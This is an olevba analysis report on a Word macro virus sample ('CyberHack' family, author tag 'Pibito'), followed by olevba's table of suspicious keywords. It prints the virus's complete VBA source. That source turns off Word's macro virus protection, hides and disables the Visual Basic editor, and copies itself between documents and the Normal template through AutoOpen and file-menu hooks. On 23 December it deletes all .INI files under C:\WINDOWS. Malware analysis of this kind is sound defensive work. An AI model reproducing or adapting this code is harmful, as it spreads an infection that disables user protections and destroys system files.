olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-32651fef79e8013456f55b35cde4dc95dfeeb53b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-32651fef79e8013456f55b35cde4dc95dfeeb53b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Pibito.bas 
in file: Virus.MSWord.CyberHack-based-32651fef79e8013456f55b35cde4dc95dfeeb53b - OLE stream: 'Macros/VBA/Pibito'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By Pibito

Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next 'Especifica que, en caso de que se produzca un error en tiempo de ejecución, el control pase a la instrucción que sigue
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0  ' Desactiva cualquier controlador de errores del procedimiento actual.
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "Pibito" Then Norok = True
      If (NMacr <> "Pibito") And (NMacr <> "MsgPib") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "Pibito", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "MsgPib", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To ad.VBProject.VBComponents.Count
      NMacr = ad.VBProject.VBComponents(i).Name
      If NMacr = "Pibito" Then Dokok = True
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "Pibito" Then Dokok = True
      If (NMacr <> "Pibito") And (NMacr <> "MsgPib") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "Pibito", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "MsgPib", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set ad = ActiveDocument
    If DokSave = 1 Then
       ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Cyber
End Sub
Sub FileClose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.FileClose


End Sub


Sub FileOpen()
    Call Cyber
    Dialogs(wdDialogFileOpen).Show
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    MsgPib.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If (Day(Now()) = 8) Or (Day(Now()) = 14) Or (Day(Now()) = 20) Then MsgPib.Show
    If (Day(Now()) = 23) And (Month(Now()) = 12) Then
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\WINDOWS"
        .SearchSubFolders = True
        .FileName = "*.INI"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For i = 1 To .FoundFiles.Count
        Kill .FoundFiles(i)
        Next i
        End If
    End With
    End If

Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Cyber
End Sub
Sub ToolsCustomize()
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
    Call Cyber
End Sub
Sub ViewVBCode()
    Call Cyber
End Sub
Sub Organizer()
End Sub


-------------------------------------------------------------------------------
VBA MACRO MsgPib.frm 
in file: Virus.MSWord.CyberHack-based-32651fef79e8013456f55b35cde4dc95dfeeb53b - OLE stream: 'Macros/VBA/MsgPib'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































Private Sub CheckBox1_Click()

End Sub

Private Sub CheckBox2_Click()

End Sub

Private Sub CommandButton1_Click()
Unload Me
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-32651fef79e8013456f55b35cde4dc95dfeeb53b' - OLE stream: 'Macros/MsgPib/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pibito@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack-based-32651fef79e8013456f55b35cde4dc95dfeeb53b' - OLE stream: 'Macros/MsgPib/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BT
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.CyberHack-based-32651fef79e8013456f55b35cde4dc95dfeeb53b' - OLE stream: 'Macros/MsgPib'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
